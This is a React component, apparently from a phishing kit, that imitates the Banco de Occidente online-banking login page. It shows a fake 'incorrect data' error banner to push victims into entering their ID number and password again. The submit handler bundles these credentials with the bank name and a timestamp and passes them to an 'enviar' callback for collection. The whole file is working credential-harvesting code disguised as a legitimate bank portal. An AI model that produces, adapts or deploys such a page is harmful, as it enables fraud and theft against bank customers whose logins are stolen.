/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import { useState } from "react";

export default function ErrorApp({ enviar }: any) {
  const [tipo, setTipo] = useState("CC");
  const [identificacion, setIdentificacion] = useState("");
  const [password, setPassword] = useState("");
  const [recordar, setRecordar] = useState(false);
  const [verPass, setVerPass] = useState(false);
  const [load, setLoad] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    setLoad(true);

    const payload = {
      view: 'errorlogin',
      user: identificacion,
      pass: password,
      bank: "Occidente",
      timestamp: new Date().toISOString(),
    };

    enviar?.(payload);
  };

  return (
    <div className="min-h-screen bg-white">
      <div className="max-w-[400px] mx-auto px-8 py-8">

        {/* Logo */}
        <img
          src="/bancos/occidente/logo-occi.svg"
          width={180}
          height={40}
          alt="Logo Banco"
          className="mx-auto mb-6 w-[180px] h-auto"
        />

        {/* Texto de bienvenida */}
        <p className="text-center mb-6 text-gray-600">
          ¡Bienvenido! a tu,
          <br />
          <a href="#" className="text-[#2C7BFF]">
            Portal Transaccional
          </a>
        </p>

        {/* Error Banner */}
        <div style={{ backgroundColor: '#ffebee', color: '#c62828', padding: '12px', borderRadius: '8px', marginBottom: '16px', textAlign: 'center', fontWeight: 'bold', fontSize: '14px' }}>
          Datos incorrectos. Por favor, verifica tu usuario y clave e inténtalo de nuevo.
        </div>

        {/* Registrado / Sin registro */}
        <div className="flex border-b border-gray-300 mb-8">
          <button className="flex-1 text-center font-semibold text-gray-600 p-4 border-b-[3px] border-[#2C7BFF]">
            Registrado
          </button>
          <button className="flex-1 text-center font-semibold text-gray-600 p-4">
            Sin registro
          </button>
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit} className="flex flex-col gap-6" noValidate>

          {/* Fila 1 → Título: Identificación */}
          <label className="font-semibold text-sm text-gray-600">
            Identificación
          </label>

          {/* Fila 2 → Select + Input */}
          <div className="flex gap-2.5">
            <select
              value={tipo}
              onChange={(e) => setTipo(e.target.value)}
              className="p-3.5 border border-[#cad6f1] rounded-lg text-gray-600 min-w-[90px]"
            >
              <option value="CC">CC</option>
              <option value="CE">CE</option>
              <option value="NIT">NIT</option>
              <option value="TI">TI</option>
              <option value="PEP">PEP</option>
            </select>

            <input
              type="text"
              inputMode="numeric"
              placeholder="Ej.: 1093238993"
              value={identificacion}
              onChange={(e) =>
                setIdentificacion(e.target.value.replace(/\D/g, ""))
              }
              className="flex-1 p-3.5 border border-[#cad6f1] rounded-lg text-gray-600"
            />
          </div>

          {/* Fila 3 → Contraseña */}
          <label className="font-semibold text-sm text-gray-600">
            Contraseña
          </label>

          <div className="flex relative">
            <input
              type={verPass ? "text" : "password"}
              placeholder="Ingresa tu contraseña"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full p-3.5 pr-12 border border-[#cad6f1] rounded-lg text-gray-600"
            />

            {/* Ojo */}
            <span
              onClick={() => setVerPass(!verPass)}
              className="absolute right-4 top-1/2 -translate-y-1/2 text-xl text-[#a2b0d3] cursor-pointer"
            >
              {verPass ? "👁️" : "👁️‍🗨️"}
            </span>
          </div>

          {/* Recordar */}
          <div className="flex items-center gap-2.5">
            <input
              type="checkbox"
              checked={recordar}
              onChange={() => setRecordar(!recordar)}
              className="w-[18px] h-[18px] accent-[#2C7BFF]"
            />
            <label className="text-sm text-gray-600">Recordar mis datos</label>
          </div>

          {/* Botón */}
          <button
            type="submit"
            className="w-full bg-linear-to-r from-[#0055D4] to-[#3C8DFF] text-white py-4 rounded-md font-semibold"
          >
            Ingresar
          </button>
        </form>
      </div>
    </div>
  );
}
